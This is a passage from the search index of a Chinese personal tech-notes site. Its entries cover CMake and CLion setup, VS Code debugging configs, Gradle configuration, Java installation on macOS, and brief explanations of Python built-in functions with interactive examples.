这样生成的默认构建工具ninja使用的时候有些问题). 若需要自行安装cmake官网版本, 可参考 /docs/后端/c/cmake 打开项目 对于cmake项目而言, 打开项目时, 项目根目录下一定要有 CMakeLists.txt 文件. CLion会根据, 且只会根据此文件去编译项目, 类似在项目根目录下执行以下指令: mkdir cmake-build-debug && cd cmake-build-debug && cmake ../ 然后会生成一个可执行的配置(就是右上角那个绿色三角形了) 找不到项目头文件 打开 CMakeLists.txt , 在其中加入头文件搜索路径, 多个路径直接换行即可: include_directories( path1 path2 ... ) 将CLion项目转换为VS工程 根目录下执行: mkdir build cd build cmake -G \"Visual Studio 16 2019\" -A x64 .. 参考:: https://www.coder.work/article/7296599 cmake详解:: https://www.cnblogs.com/kuliuheng/p/9431275.html 注解 cmake 与 make 相比能够更好的实现跨平台的兼容. cmake: 根据 CMakeLists.txt 生成适配不同平台的 makefile, 再根据此makefile去执行编译 makefile: 直接根据makefile内容编译生成","tags":"后端","url":"/yq-doc-source-docs-rear-end-from-Use-CLION.html","loc":"/yq-doc-source-docs-rear-end-from-Use-CLION.html"},{"title":"cmake","text":"安装 下载地址: https://cmake.org/download/ 执行以下命令设置环境变量: sudo \"/Applications/CMake.app/Contents/bin/cmake-gui\" --install 例如这样的输出: yanque@yanquedembp PlantsVsZombies % sudo \"/Applications/CMake.app/Contents/bin/cmake-gui\" --install Password: Linked: '/usr/local/bin/cmake' -> '/Applications/CMake.app/Contents/bin/cmake' Linked: '/usr/local/bin/ctest' -> '/Applications/CMake.app/Contents/bin/ctest' Linked: '/usr/local/bin/cpack' -> '/Applications/CMake.app/Contents/bin/cpack' Linked: '/usr/local/bin/cmake-gui' -> '/Applications/CMake.app/Contents/bin/cmake-gui' Linked: '/usr/local/bin/ccmake' -> '/Applications/CMake.app/Contents/bin/ccmake' yanque@yanquedembp PlantsVsZombies % 基本语法 注释: 使用# 命令不区分大小写, 变量区分大小写 定义变量: set - 定义字符串: set(var1 str_data) - 定义列表: set(var_list var1 var2 var3 ...) - bool: True就是ON, False就是OFF, 如set(bool_var OFF) - 使用美元符加花括号 ${} 来访问定义的变量, 若使用与if语句, 则不需要, 直接使用变量名称即可 - 访问环境变量: 与普通变量相比, 需要加上 ENV, 如$ENV{VariableName} 打印输出: 使用 message, 如message(\"var=${var}\") 常用变量 常用变量: UNIX 如果为真，表示为UNIX-like的系统，包括AppleOSX和CygWin WIN32 如果为真，表示为 Windows 系统，包括 CygWin APPLE 如果为真，表示为 Apple 系统 CMAKE_SIZEOF_VOID_P 表示void*的大小（例如为4或者8），可以使用其来判断当前构建为32位还是64位 CMAKE_CURRENT_LIST_DIR 表示正在处理的CMakeLists.txt文件的所在的目录的绝对路径(2.8.3以及以后版本才支持) CMAKE_ARCHIVE_OUTPUT_DIRECTORY 用于设置ARCHIVE目标的输出路径 CMAKE_LIBRARY_OUTPUT_DIRECTORY 用于设置LIBRARY目标的输出路径 CMAKE_RUNTIME_OUTPUT_DIRECTORY 用于设置RUNTIME目标的输出路径 参考:: https://blog.csdn.net/qq_23123181/article/details/122736393?spm=1001.2101.3001.6650.2&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-2-122736393-blog-80902807.pc_relevant_recovery_v2&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-2-122736393-blog-80902807.pc_relevant_recovery_v2&utm_relevant_index=3 https://blog.csdn.net/zhanghm1995/article/details/80902807","tags":"后端","url":"/yq-doc-source-docs-rear-end-from-cmake.html","loc":"/yq-doc-source-docs-rear-end-from-cmake.html"},{"title":"cmakelists.txt编写","text":"cmakelists.txt是基于cmake指令的. 普通变量 使用 set(var value) 赋值, 使用 ${} 方式取值,但是在IF控制语句中是直接使用变量名 获取环境变量 使用 $ENV{} 方式取值,使用 SET(ENV{VAR} VALUE) 赋值 定义bool变量 使用 set, 以下相当 bool DEBUG = True SET(DEBUG ON) OFF 就是 False 注解 像set这种关键字不区分大小写, 但是变量名区分大小写; 使用 if 语句时, 直接使用变量名, 不需要用花括号包裹 打印输出 使用 MESSAGE MESSAGE(\"DEBUG=\" ${DEBUG}) 执行cmake指令 使用execute_process 创建文件夹 使用 execute_process, 创建一个newdir, 注意定义 new_dir: execute_process( COMMAND ${CMAKE_COMMAND} -E make_directory ${new_dir}) 复制文件夹 使用 execute_process, 将dir1复制到dir2, 注意定义 dir1 dir2: execute_process( COMMAND ${CMAKE_COMMAND} -E copy_directory ${dir1} ${dir2}) 复制文件 使用 execute_process, 将file1复制到file2, 注意定义 file1 file2: execute_process( COMMAND ${CMAKE_COMMAND} -E copy ${file1} ${file2}) 添加子目录的CMakeLists.txt 如, 在根目录下, 新建Stack目录, 在Stack中建立一个CMakeLists.txt文件 根目录需增加如下语句: add_subdirectory(Stack) 更多见: /docs/后端/c/cmake","tags":"后端","url":"/yq-doc-source-docs-rear-end-from-cmakelists.html","loc":"/yq-doc-source-docs-rear-end-from-cmakelists.html"},{"title":"vscode调试相关","text":"调试命令工具 gdb lldb 注解 lldb 是mac上才有的, xcode低版本使用的是gdb调试, 高版本换成了内置lldb 另外, gcc 与 g++ 是编译为可执行文件的, gdb与lldb才是调试工具. 指令区别: lldb与gdb命令名的对照表 配置经验 创建launch.json调试器, 支持直接调试与附加调试(这个配置是给左侧的调试器使用的) 例: { \"version\": \"0.2.0\", \"configurations\": [ { \"name\": \"(lldb) 启动\", \"type\": \"cppdbg\", \"request\": \"launch\", \"program\": \"${fileDirname}/.debug/${fileBasenameNoExtension}.out\", \"args\": [], \"stopAtEntry\": false, \"cwd\": \"${fileDirname}\", \"environment\": [], \"externalConsole\": false, \"MIMode\": \"lldb\", \"preLaunchTask\": \"pre build\" } ] } 类似c/c++程序, 调试之前需要先编译为可执行文件, 这个时候就需要用到task.json配置任务, 此处的 label 与 launch.json 的 preLaunchTask 保持一致 例: { \"tasks\": [ { \"label\": \"pre build\", \"type\": \"cppbuild\", \"command\": \"/usr/bin/g++\", \"args\": [ \"-fdiagnostics-color=always\", \"-g\", \"${file}\", \"-o\", \"${fileDirname}/.debug/${fileBasenameNoExtension}.out\" ], \"options\": { \"cwd\": \"${fileDirname}\" }, \"problemMatcher\": [ \"$gcc\" ], \"group\": { \"kind\": \"build\", \"isDefault\": true }, \"detail\": \"调试器生成的任务。\" } ], \"version\": \"2.0.0\" } 注解 gcc指定输出位置的时候, 有bug..., 会导致卡住. 另外右上角的启动调试与左边的不是一个东西. F5启动的也是左边配置的. 也就是, F5启动的是json配置的调试, 直接右上角run是内置的直接执行编译运行指令(不过编译那一步会写到task.json种). 配置文件说明 launch.json 这个可以不用设置, 直接使用task.json里任务生成输出文件 task.json 用来配置任务, 可在launch.json里配置什么时候掉用 c_cpp_properties.json 用于给插件配置, 比如使用的 include_path, 注意这里只是给插件使用的, 如果需要执行或者编译的时候使用需要自定义编译时候的参数, 如 g++ -L 指定库路径 注解 注意 c_cpp_properties 配置的 include_path 不能用于执行时使用. 执行时候只能自定义参数, 可以通过在 setting.json 配置 code-runner.executorMap 处理. 其他 可以选择小三角形的启动方式 启动选项 可以通过设置选择启动选项相对应的任务 选择启动选项实际的执行","tags":"后端","url":"/yq-doc-source-docs-rear-end-from-vSCode-debugging-related.html","loc":"/yq-doc-source-docs-rear-end-from-vSCode-debugging-related.html"},{"title":"资源文件介绍","text":"res/layout/main.xml App主窗体布局文件，应用长什么样都在这边定义，有Design和Text两种模式 res/values/strings.xml 可以理解为i18n文件，用来存放程序调用的各种字符串 src/com/example/helloandroid/MyActivity.java 主程序类，要实现的功能都在这个文件里添加","tags":"后端","url":"/yq-doc-source-docs-rear-end-java-Android-development-Resource-file-introduction.html","loc":"/yq-doc-source-docs-rear-end-java-Android-development-Resource-file-introduction.html"},{"title":"配置文件说明","text":"build.gradle settings.gradle 注解 settings.gradle 编译优先级高于build.gradle build.gradle build.gradle 是项目构建所使用的脚本。 settings.gradle settings.gradle 必要的一些设置，例如，任务或项目之间的依懒关系等 settings.gradle是模块Module配置文件，主要是用于配置子模块， 根目录下的setting.gradle脚本文件是针对module的全局配置, 如: // 为指定父模块的名称 平台根 rootProject.name = 'project-root' //包含子系统以及模块 include ':project-core' //Hello系统模块的加载 include ':project-hello' //World系统模块的加载 include ':project-world' 单项目构建该文件可选，多项目构建必须, 因为需要在这个文件中声明哪些子项目需要参与构建，也包括子项目路径、名称等. 多项目的构建原则: 如果该构建目录中存在settings.gradle文件，那么就依据该文件来进行构建； 如果不存在该文件，那么会向上一级目录查询文件是否存在(注意：只会向父目录查询，而不是一直向上级目录递归查询)， 如果存在就依据该文件进行构建，否则此次构建就是一个单项目的构建 文件结构及其配置 plugins: 需要引进的相关插件Plugins, 此处调用了 PluginDependenciesSpec 中的 id 方法, 如: // 需要引进的相关插件Plugins plugins { // 'com.android.application' 表示应用com.android.application插件 id 'com.android.application' } repositories: 仓库配置, 用于存储依赖(从哪下载依赖), 如: // repositories闭包 存储库 // 声明在何处查找项目的依赖项 repositories { // 指定使用maven本地仓库，而本地仓库在配置maven时setting文件指定的仓库位置。 mavenLocal() maven { name \"aliyun\" url \"https://maven.aliyun.com/repository/gradle-plugin\" } // 这是Maven的中央仓库，无需配置，直接声明就可以使用 mavenCentral() // JCenter中央仓库，实际也是是用的maven搭建的，但相比Maven仓库更友好，通过CDN分发，并且支持https访问。 // jcenter() } dependencies: 依赖声明, 如: // dependencies闭包 依赖 // 是用于声明这个项目依赖于哪些jar dependencies { implementation 'org.springframework.boot:spring-boot-starter-web' } gradle.properties 定义一些执行的属性 脚本位置一般在 $GRADLE_USER_HOME/ 目录下. 但, 我的Mac个人目录下有一个 .gradle , 这下面有一个, 貌似是如果没设置, 默认就是这个目录? 暂时还没看到有说明. 可参考官网文档: https://docs.gradle.org/current/userguide/build_environment.html init.gradle 初始化时执行的脚本, 详情可参考: https://docs.gradle.org/current/userguide/init_scripts.html 到这里的时候, 想起安装时候有看到说设置环境变量 GRADLE_HOME , 目前为止貌似没看到官方文档有提到用处 使用方式 可以通过命令行参数 -I 或者 --init-script 跟文件路径来指定, 支持多个, 也可以直接将其文件放在 $GRADLE_USER_HOME/ 目录下. (需提前设置此环境变量) 若有多个文件, 可以将其命令为以 .gradle 结尾的文件, 然后放到 $GRADLE_USER_HOME/init.d/ 目录下. 脚本支持的内容, 如build.gradle: repositories { mavenCentral() } tasks.register('showRepos') { def repositoryNames = repositories.collect { it.name } doLast { println \"All repos:\" println repositoryNames } } 设置源大抵也得放到这里, 不过我机器使用官方的源也挺快, 就没设置. 如init.gradle: allprojects { repositories { mavenLocal() } } // 声明额外依赖 initscript { repositories { mavenCentral() } dependencies { classpath 'org.apache.commons:commons-math:2.0' } } 之前冲浪看到有人说高版本已经废弃了allprojects, 但是官网文档还有这个... 然后使用命令行可以这么: > gradle --init-script init.gradle -q showRepos All repos: [MavenLocal, MavenRepo] 工作流程 工作流程: 初始化阶段(首先解析settings.gradle) ==》 Configration阶段(解析每个Project中的build.gradle，解析过程中并不会执行各个build.gradle中的task) 一个 Project 包含很多 Task, 每个 Task 之间有依赖关系","tags":"后端","url":"/yq-doc-source-docs-rear-end-java-Build-tools-Gradle-Configuration-file-description.html","loc":"/yq-doc-source-docs-rear-end-java-Build-tools-Gradle-Configuration-file-description.html"},{"title":"相关环境变量说明","text":"","tags":"后端","url":"/yq-doc-source-docs-rear-end-java-Build-tools-Gradle-Related-environment-variable-description.html","loc":"/yq-doc-source-docs-rear-end-java-Build-tools-Gradle-Related-environment-variable-description.html"},{"title":"Maven","text":"","tags":"后端","url":"/yq-doc-source-docs-rear-end-java-Build-tools-maven.html","loc":"/yq-doc-source-docs-rear-end-java-Build-tools-maven.html"},{"title":"java文件的编译执行","text":"很久没用java, 在vscode里写测试都忘了类名需要与文件名一致... 以, test_run.java 文件为例. 编译class文件, -d指定输出目录: javac -d __javacache__ test_run.java 运行, 无需class后缀, 若自定义了输出路径, 需要使用 -cp 指定查找路径: java -cp __javacache__ test_run","tags":"后端","url":"/yq-doc-source-docs-rear-end-java-Compile-execution.html","loc":"/yq-doc-source-docs-rear-end-java-Compile-execution.html"},{"title":"IDEA配置Gradle项目","text":"主要注意版本匹配的问题, 如: gradle与java版本之间要对应","tags":"后端","url":"/yq-doc-source-docs-rear-end-java-Idea-configuration-Gradle-project.html","loc":"/yq-doc-source-docs-rear-end-java-Idea-configuration-Gradle-project.html"},{"title":"Java安装配置","text":"可官网下载: https://www.oracle.com/cn/java/technologies/downloads/#java20 解压后需要设置的环境变量: JAVA_HOME, 就是安装目录 PATH, 就是 安装目录/bin. (当键盘键入java时, 会找这个目录下的java) 特殊说明-Mac下Java安装的说明 当前系统: MacOs13 使用Java的时候发现系统有一个默认的 /usr/bin/java , 无法删除, 据说即使想办法删掉后, 重启后还会自己恢复. 所以最开始, 是直接把环境变量的JAVA_HOME写到所有环境变量的前面来解决的. 后面偶然发现这个不是主要原因. 仅以Mac下的 /usr/bin/java 来说明, 同目录下的其它文件可能也是这个原理, 还没测试过... /usr/bin/java 会默认去找 /Library/Java/JavaVirtualMachines 下面安装好的JDK, 故, 若使用的是压缩包什么的安装在了其它目录, 需要移动到这个目录下面, 或者软链接过来, 比如我下载的JDK20解压包在 /usr/local/java/jdk-20.0.1.jdk , 使用以下命令链接: sudo ln -sn /usr/local/java/jdk-20.0.1.jdk /Library/Java/JavaVirtualMachines/jdk-20.0.1.jdk 看一下链接后的内容: ls /Library/Java/JavaVirtualMachines jdk-20.0.1.jdk jdk1.8.0_311.jdk temurin-8.jdk 测试: /usr/bin/java --version java 20.0.1 2023-04-18 Java(TM) SE Runtime Environment (build 20.0.1+9-29) Java HotSpot(TM) 64-Bit Server VM (build 20.0.1+9-29, mixed mode, sharing) 注解 Mac有内置的获取JAVA_HOME的指令: /usr/libexec/java_home Mac下的卸载 同理, /usr/bin/java 不能被删除, 不用管, 直接更新一下 profile 配置的环境变量(看当初安装配置的时候设置在哪), 然后删除 /Library/Java/JavaVirtualMachines 下面相关版本即可. 貌似可以不用删? 看起来找版本是从高到低的, 还没试过, 之前的两个11版本被我删完了, 1.8的貌似没有被自动识别, 以后有机会在试.","tags":"后端","url":"/yq-doc-source-docs-rear-end-java-Install.html","loc":"/yq-doc-source-docs-rear-end-java-Install.html"},{"title":"一些备忘","text":"MacOs查看安装路径: /usr/libexec/java_home -V Java运行时环境（JRE）","tags":"后端","url":"/yq-doc-source-docs-rear-end-java-Some-memo.html","loc":"/yq-doc-source-docs-rear-end-java-Some-memo.html"},{"title":"chr","text":"chr() 用一个范围在 range（256）内的（就是0～255）整数作参数，返回一个对应的字符。","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Built--in-function-CHR.html","loc":"/yq-doc-source-docs-rear-end-python-Built--in-function-CHR.html"},{"title":"cmp","text":"注解 Python3 中已经移除, 可以使用 operator 模块: /docs/后端/python/python标准库/operator cmp(x,y) 函数用于比较2个对象，如果 x < y 返回 -1, 如果 x == y 返回 0, 如果 x > y 返回 1","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Built--in-function-CMP.html","loc":"/yq-doc-source-docs-rear-end-python-Built--in-function-CMP.html"},{"title":"dict","text":"生成一个字典 支持将两个值的迭代转换为字典: In [1]: a = [(1, 2), (2, 3), (3, 4)] In [2]: dict(a) Out[2]: {1: 2, 2: 3, 3: 4} In [3]: dict(tuple(a)) Out[3]: {1: 2, 2: 3, 3: 4} In [4]: 合并多个字典 这里要注意 **参数关键字必须是字符串: dict(dict1, **dict2, **dict3)","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Built--in-function-DICT.html","loc":"/yq-doc-source-docs-rear-end-python-Built--in-function-DICT.html"},{"title":"filter","text":"filter() 函数用于过滤序列，过滤掉不符合条件的元素，返回由符合条件元素组成的新列表。 Python2.7 返回列表 Python3.x 返回迭代器对象 过滤出列表中的所有奇数: def is_odd(n): return n % 2 == 1 newlist = filter(is_odd, [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]) print(newlist)","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Built--in-function-Filter.html","loc":"/yq-doc-source-docs-rear-end-python-Built--in-function-Filter.html"},{"title":"iter","text":"创建一个迭代器 iter 函数一个鲜为人知的特性是它接受一个可选的 callable 对象和一个标记 (结 尾) 值作为输入参数。 当以这种方式使用的时候，它会创建一个迭代器，这个迭代器会 不断调用 callable 对象直到返回值和标记值相等为止。 例: >>> import sys >>> f = open('/etc/passwd') >>> for chunk in iter(lambda: f.read(10), ''): ... n = sys.stdout.write(chunk) ... nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false root:*:0:0:System Administrator:/var/root:/bin/sh daemon:*:1:1:System Services:/var/root:/usr/bin/false _uucp:*:4:4:Unix to Unix Copy Protocol:/var/spool/uucp:/usr/sbin/uucico ... >>>","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Built--in-function-ITER.html","loc":"/yq-doc-source-docs-rear-end-python-Built--in-function-ITER.html"},{"title":"ord","text":"ord() 函数是 chr() 函数（对于8位的ASCII字符串, 见 /docs/后端/python/内置函数/chr ） 或 unichr() 函数（对于Unicode对象）的配对函数， 它以一个字符（长度为1的字符串）作为参数，返回对应的 ASCII 数值，或者 Unicode 数值， 如果所给的 Unicode 字符超出了你的 Python 定义范围，则会引发一个 TypeError 的异常。","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Built--in-function-ORD.html","loc":"/yq-doc-source-docs-rear-end-python-Built--in-function-ORD.html"},{"title":"str/repr","text":"str 与 repr 函数的效果差不多, 所以就放到一起说了. 对于继承了 object 的类(新式类)而言, 可以通过重写: __str__() __repr__() 来更改默认行为. 一般而言, repr 用于 开发/测试, str 用于正式场景 若没有定义 __str__ 而定义了 __repr__ , 则使用 str, 会调用 __repr__ 可以看看默认的例子: In [7]: @dataclass ...: class MTest(object): ...: name: str ...: age: int ...: In [8]: m = MTest('tt', 12) In [9]: str(m) Out[9]: \"MTest(name='tt', age=12)\" In [10]: repr(m) Out[10]: \"MTest(name='tt', age=12)\" 可以发现默认实现的没有什么差别. 这时候如果需要不一致, 就需要自己重写了... 理想的情况: In [14]: import datetime In [15]: d = datetime.datetime.now() In [16]: d Out[16]: datetime.datetime(2023, 4, 13, 9, 37, 55, 887361) In [17]: str(d) Out[17]: '2023-04-13 09:37:55.887361' In [18]: repr(d) Out[18]: 'datetime.datetime(2023, 4, 13, 9, 37, 55, 887361)'","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Built--in-function-Str,-REPR.html","loc":"/yq-doc-source-docs-rear-end-python-Built--in-function-Str,-REPR.html"},{"title":"type","text":"一个参数 一个参数返回类型 三个参数(或者大于1) 以第一个参数为类名, 第二个参数为父类元祖, 第三个参数为赋值 用例: # coding: utf-8 class A ( object ): a = 1 class B ( object ): b = 2 def something (): print ( 'some' ) c = type ( A ), type ( A ()) d = type ( 'D' , ( A , B ), { 'something' : something }) print ( '一个参数' , c ) print ( '三个参数' , d , d . __dict__ , d . a , d . b ) # 输出 # 一个参数 (<class 'type'>, <class '__main__.A'>) # 三个参数 <class '__main__.D'> {'something': <function something at 0x109e410d0>, '__module__': '__main__', '__doc__': None} 1 2","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Built--in-function-Type.html","loc":"/yq-doc-source-docs-rear-end-python-Built--in-function-Type.html"},{"title":"vars","text":"获取局部变量表, 或者对象属性.","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Built--in-function-Vars.html","loc":"/yq-doc-source-docs-rear-end-python-Built--in-function-Vars.html"},{"title":"__str__","text":"当使用print输出对象的时候，只要自己定义了 __str__(self) 方法，那么就会打印从在这个方法中return的数据 比如: class Cat: def __str__(self): return \"猫\" t = Cat() print(t) # 猫","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Built--in-function-__Str__.html","loc":"/yq-doc-source-docs-rear-end-python-Built--in-function-__Str__.html"},{"title":"any","text":"any() 函数用于判断给定的可迭代参数 iterable 是否全部为 False 元素除了是 0、空、FALSE 外都算 TRUE。 函数等价于: def any(iterable): for element in iterable: if element: return True return False","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Built--in-function-any.html","loc":"/yq-doc-source-docs-rear-end-python-Built--in-function-any.html"},{"title":"async for","text":"异步迭代器. 普通对象的for循环只需要实现 __iter__ 即可 对于 async for而言, 若需要支持, 需要实现 __aiter__ 返回一个异步迭代器（asynchronous iterator）对象; 若需要对象本身就是一个迭代器. 还需要实现 __anext__ , 返回一个awaitable类型的值(异步迭代器对象); 例: class AsyncIteratorWrapper: def __init__(self, obj): self._it = iter(obj) def __aiter__(self): return self async def __anext__(self): try: value = next(self._it) except StopIteration: raise StopAsyncIteration return value async for letter in AsyncIteratorWrapper(\"abc\"): print(letter)","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Built--in-function-async_For.html","loc":"/yq-doc-source-docs-rear-end-python-Built--in-function-async_For.html"},{"title":"bytearray","text":"bytearray() 方法返回一个新字节数组。这个数组里的元素是可变的，并且每个元素的值范围: 0 <= x < 256。 bytearray() 的使用方法: >>>bytearray() bytearray(b'') >>> bytearray([1,2,3]) bytearray(b'\\x01\\x02\\x03') >>> bytearray('runoob', 'utf-8') bytearray(b'runoob') >>>","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Built--in-function-bytearray.html","loc":"/yq-doc-source-docs-rear-end-python-Built--in-function-bytearray.html"},{"title":"divmod","text":"python divmod() 函数把除数和余数运算结果结合起来，返回一个包含商和余数的元组(a // b, a % b) 例: >>>divmod(7, 2) (3, 1) >>> divmod(8, 2) (4, 0) >>> divmod(1+2j,1+0.5j) ((1+0j), 1.5j)","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Built--in-function-divmod.html","loc":"/yq-doc-source-docs-rear-end-python-Built--in-function-divmod.html"},{"title":"enumerate","text":"enumerate() 函数返回的是一个 enumerate 对象实例，它是一个迭代器，返回连 续的包含一个计数和一个值的元组， 元组中的值通过在传入序列上调用 next() 返回。 接受一个参数作为起始序号, 默认为0: >>> my_list = ['a', 'b', 'c'] >>> for idx, val in enumerate(my_list, 1): ... print(idx, val) ... 1a 2b 3c","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Built--in-function-enumerate.html","loc":"/yq-doc-source-docs-rear-end-python-Built--in-function-enumerate.html"},{"title":"format","text":"有个功能是字符串对齐: format('ssd', '>20') Out[24]: ' ssd'","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Built--in-function-format.html","loc":"/yq-doc-source-docs-rear-end-python-Built--in-function-format.html"},{"title":"max","text":"max() 函数返回有最大值的项目，或者 iterable 中有最大值的项目。 如果值是字符串，则按字母顺序进行比较。","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Built--in-function-max.html","loc":"/yq-doc-source-docs-rear-end-python-Built--in-function-max.html"},{"title":"min","text":"min() 函数返回值最小的项目，或 iterable 中值最小的项目。 如果值是字符串，则按字母顺序进行比较。","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Built--in-function-min.html","loc":"/yq-doc-source-docs-rear-end-python-Built--in-function-min.html"},{"title":"open","text":"python open() 函数用于打开一个文件，创建一个 file 对象，相关的方法才可以调用它进行读写。 不同模式打开文件的完全列表： 模式 描述 t 文本模式 (默认)。 x 写模式，新建一个文件，如果该文件已存在则会报错。 b 二进制模式。 打开一个文件进行更新(可读可写)。 U 通用换行模式（不推荐）。 r 以只读方式打开文件。文件的指针将会放在文件的开头。这是默认模式。 rb 以二进制格式打开一个文件用于只读。文件指针将会放在文件的开头。这是默认模式。一般用于非文本文件如图片等。 r+ 打开一个文件用于读写。文件指针将会放在文件的开头。 rb+ 以二进制格式打开一个文件用于读写。文件指针将会放在文件的开头。一般用于非文本文件如图片等。 w 打开一个文件只用于写入。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。 wb 以二进制格式打开一个文件只用于写入。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。一般用于非文本文件如图片等。 w+ 打开一个文件用于读写。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。 wb+ 以二进制格式打开一个文件用于读写。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。一般用于非文本文件如图片等。 a 打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。也就是说，新的内容将会被写入到已有内容之后。如果该文件不存在，创建新文件进行写入。 ab 以二进制格式打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。也就是说，新的内容将会被写入到已有内容之后。如果该文件不存在，创建新文件进行写入。 a+ 打开一个文件用于读写。如果该文件已存在，文件指针将会放在文件的结尾。文件打开时会是追加模式。如果该文件不存在，创建新文件用于读写。 ab+ 以二进制格式打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。如果该文件不存在，创建新文件用于读写。 x 文件不存在才能写入 file 对象方法 实例 测试文件 test.txt，内容如下: RUNOOB1 RUNOOB2 >>>f = open('test.txt') >>> f.read() 'RUNOOB1\\nRUNOOB2\\n'","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Built--in-function-open.html","loc":"/yq-doc-source-docs-rear-end-python-Built--in-function-open.html"},{"title":"pow","text":"pow() 方法返回 xy（x 的 y 次方） 的值。 math 模块中也提供了这个函数 math 模块 pow() 方法的语法: import math math . pow ( x , y ) 内置的 pow() 方法 pow ( x , y [, z ]) 函数是计算 x 的 y 次方，如果 z 在存在，则再对结果进行取模，其结果等效于: pow(x,y) % z 注解 pow() 通过内置的方法直接调用， 内置方法会把参数作为整型 ，而 math 模块则会把参数转换为 float 。","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Built--in-function-pow.html","loc":"/yq-doc-source-docs-rear-end-python-Built--in-function-pow.html"},{"title":"print","text":"这个本来不用说的, 但是想了想还是记录一下 注解 其实大多属于字符串输出本身的 输出指定行长度, 可以使用 {:长度} 形式; 比如输出123, 长度为40: In [3]: \"|{:40}|\".format(\"123\") Out[3]: '|123 |' In [4]: f\"|{'123':40}|\" Out[4]: '|123 |' print与sys.stdout.write sys.stdout.write() 只能输出一个字符串str，而 print() 可以输出多个值，数据类型多样。 print(obj) 实际上是调用 sys.stdout.write(obj+'\\n') ，因此print在打印时会自动加个换行符。","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Built--in-function-print.html","loc":"/yq-doc-source-docs-rear-end-python-Built--in-function-print.html"},{"title":"round","text":"round() 方法返回浮点数x的四舍五入值。 不过有一个坑. 正常情况不是数学意思上的四舍五入而是四舍六入 在 Python2 中, 如果n的后一位为 5 时, 最终返回值为距离0远的一边; 在 Python3 中, 如果n的后一位为 5 时, 最终返回值会保留到偶数的一边. 如: round(1.5) Out[6]: 2 round(0.5) Out[7]: 0 另外还有一个情况: round(2.355, 2) Out[3]: 2.35 不管是哪个版本, 理论上都应该是是 2.36 的, 但是由于精度问题, 会导致机器内部实际表示的数值比看到的值要小, 以至于出现这种情况, 并不是bug","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Built--in-function-round.html","loc":"/yq-doc-source-docs-rear-end-python-Built--in-function-round.html"},{"title":"slice","text":"切片操作 slice() 函数返回 slice 对象（切片）。 slice 对象用于指定如何对序列进行裁切。 您可以指定在哪里开始裁切以及在哪里结束裁切。 您还可以指定步进，例如只切每隔一个项目。 支持有趣的操作: >>> items = [0, 1, 2, 3, 4, 5, 6] >>> a = slice(2, 4) >>> items[2:4] [2, 3] >>> items[a] [2, 3] >>> items[a] = [10,11] >>> items [0, 1, 10, 11, 4, 5, 6] >>> del items[a] >>> items [0, 1, 4, 5, 6] 可以分别调用它的 a.start , a.stop , a.step 属性 来获取更多的信息。比如: >>> a = slice(5, 50, 2) >>> a.start 5 >>> a.stop 50 >>> a.step 2 >>> 还能通过调用切片的 indices(size) 方法将它映射到一个确定大小的序 列上， 这个方法返回一个三元组 (start, stop, step) ，所有值都会被合适的缩小以 满足边界限制， 从而使用的时候避免出现 IndexError 异常。比如: >>> s = 'HelloWorld' >>> a.indices(len(s)) (5, 10, 2) >>> for i in range(*a.indices(len(s))): ... print(s[i]) ... W r d >>>","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Built--in-function-slice.html","loc":"/yq-doc-source-docs-rear-end-python-Built--in-function-slice.html"},{"title":"sorted","text":"对所有可迭代的对象进行排序操作 sort 与 sorted 区别： sort 是应用在 list 上的方法，sorted 可以对所有可迭代的对象进行排序操作。 list 的 sort 方法返回的是对已经存在的列表进行操作，无返回值. 内建函数 sorted 方法返回的是一个新的 list，而不是在原来的基础上进行的操作。","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Built--in-function-sorted.html","loc":"/yq-doc-source-docs-rear-end-python-Built--in-function-sorted.html"},{"title":"with","text":"with相当于 try catch finnally语句 自定义的with语句, 需要实现: # coding: utf-8 class TW(object): # with包含初始化时执行, 返回值给到语句定义的as别名 def __enter__(self): return 999 # 出现异常或者正常结束时候执行 # 返回值为True时, 不抛出异常, 否则正常抛出异常 def __exit__(self, exc_type, exc_val, exc_tb): if exc_tb: print(exc_type, exc_val, exc_tb) return True with TW() as t: print(t) raise ValueError('error test') async with语句 异步上下文管理器. 用于异步编程. 与 with 不同的是, 如果要实现异步的调用, 需要实现 __aenter__ 与 __aexit__ 方法: class AsyncContextManager: async def __aenter__(self): await log('entering context') async def __aexit__(self, exc_type, exc, tb): await log('exiting context') 这时就可以异步调用: async with AsyncContextManager(): ...","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Built--in-function-with.html","loc":"/yq-doc-source-docs-rear-end-python-Built--in-function-with.html"},{"title":"字典操作","text":"字典的一些说明 Python3.7之后, 